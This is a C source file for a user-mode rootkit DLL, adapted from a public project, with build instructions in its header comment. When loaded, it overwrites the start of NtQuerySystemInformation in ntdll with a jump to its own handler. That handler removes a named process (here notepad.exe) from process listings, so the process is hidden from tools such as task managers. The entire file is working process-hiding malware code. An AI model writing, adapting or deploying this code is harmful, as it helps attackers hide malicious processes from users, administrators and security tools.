/*
    author: 
    hasbiyama (@3xploitZero)
    github.com/hasbiyama)

    gcc -o procHide.dll -shared -fPIC procHide_v2.c -s

    credit       : ZeroMemoryEx
    originalCode : https://github.com/ZeroMemoryEx/URootkit/blob/master/URootkit/dllmain.cpp

*/

#include <windows.h>
#include <winternl.h>
#include <string.h>

#define PATCH_SIZE 16
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#define TARGET_PROCESS L"notepad.exe"

// Global variables
static LPVOID NtQuerySysInfoAddr = NULL; // Address of NtQuerySystemInformation
static unsigned char OriginalOpcodes[PATCH_SIZE]; // Original opcodes of the function
static unsigned char HookOpcodes[PATCH_SIZE] = {
    0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // MOV RAX, address of the hook
    0xFF, 0xE0,                         // JMP RAX
    0x90, 0x90, 0x90, 0x90              // NOP padding
};

// Typedef for NtQuerySystemInformation
typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG
);

// Function to set memory protection to writable
BOOL SetMemoryWritable(LPVOID addr, SIZE_T size) {
    DWORD oldProtect;
    return VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &oldProtect);
}

// Function to restore the original opcodes
BOOL RestoreOriginalOpcodes() {
    return NtQuerySysInfoAddr && WriteProcessMemory(
        GetCurrentProcess(), NtQuerySysInfoAddr, OriginalOpcodes, PATCH_SIZE, NULL);
}

// Function to reapply the hook
BOOL ReapplyHook() {
    return NtQuerySysInfoAddr && WriteProcessMemory(
        GetCurrentProcess(), NtQuerySysInfoAddr, HookOpcodes, PATCH_SIZE, NULL);
}

// Hooked version of NtQuerySystemInformation
NTSTATUS NTAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS class, PVOID info, ULONG length, PULONG returnLength) {

    // Restore original opcodes before calling the original function
    if (!NtQuerySysInfoAddr || !RestoreOriginalOpcodes()) {
        return STATUS_UNSUCCESSFUL;
    }

    // Call the original NtQuerySystemInformation function
    NtQuerySystemInformation_t originalFunc = (NtQuerySystemInformation_t)NtQuerySysInfoAddr;
    NTSTATUS status = originalFunc(class, info, length, returnLength);

    // If querying process information, modify the result
    if (class == SystemProcessInformation && NT_SUCCESS(status)) {
        PSYSTEM_PROCESS_INFORMATION current = (PSYSTEM_PROCESS_INFORMATION)info;
        PSYSTEM_PROCESS_INFORMATION prev = NULL;

        while (current->NextEntryOffset) {
            PSYSTEM_PROCESS_INFORMATION next = 
                (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)current + current->NextEntryOffset);
            
            // Check if the process name matches TARGET_PROCESS
            if (next->ImageName.Buffer && wcscmp(next->ImageName.Buffer, TARGET_PROCESS) == 0) {
                if (next->NextEntryOffset) {
                    current->NextEntryOffset += next->NextEntryOffset;
                } else {
                    current->NextEntryOffset = 0; // End of list
                }
                continue; // Skip the current process
            }

            // Move to the next process
            prev = current;
            current = next;
        }
    }

    // Reapply the hook after calling the original function
    ReapplyHook();
    return status;
}

// Function to set up the hook
BOOL SetupHook() {
    // Get the address of NtQuerySystemInformation
    NtQuerySysInfoAddr = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQuerySysInfoAddr) {
        return FALSE;
    }

    // Read the original opcodes of the function
    if (!ReadProcessMemory(GetCurrentProcess(), NtQuerySysInfoAddr, OriginalOpcodes, PATCH_SIZE, NULL)) {
        return FALSE;
    }

    // Prepare the hook opcodes
    void* hookTarget = (void*)&HookedNtQuerySystemInformation;
    memcpy(HookOpcodes + 2, &hookTarget, sizeof(void*));

    // Make memory writable and apply the hook
    return SetMemoryWritable(NtQuerySysInfoAddr, PATCH_SIZE) &&
           WriteProcessMemory(GetCurrentProcess(), NtQuerySysInfoAddr, HookOpcodes, PATCH_SIZE, NULL);
}

// Cleanup function to restore original opcodes
void Cleanup() {
    if (NtQuerySysInfoAddr) {
        RestoreOriginalOpcodes();
    }
}

// DLL entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            return SetupHook();
        case DLL_PROCESS_DETACH:
            Cleanup();
            break;
    }
    return TRUE;
}